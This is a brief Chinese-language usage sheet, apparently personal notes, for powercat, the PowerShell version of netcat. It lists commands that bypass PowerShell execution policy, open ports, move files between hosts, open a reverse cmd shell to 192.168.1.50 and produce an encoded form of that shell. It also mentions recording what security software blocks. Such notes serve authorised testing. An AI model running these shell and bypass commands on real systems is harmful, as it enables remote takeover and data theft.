# powercat 使用

powercat 是 PowerShell 版 netcat，适合 Windows 环境里的端口连接、监听、文件传输和简单隧道测试。它的优势是单脚本、参数直接。

## 加载和连接

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.168.1.50 -p 4444"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -l -p 4444"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.168.1.50 -p 4444 -e cmd"
```

## 文件传输

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -l -p 9001 -of file.bin"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.168.1.50 -p 9001 -i file.bin"
```

## 编码输出

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.168.1.50 -p 4444 -e cmd -ge"
```

小记录：powercat 适合临时验证连通性和 Windows 侧操作。长时间通道建议换更稳定的隧道工具，并记录防护软件拦截情况。
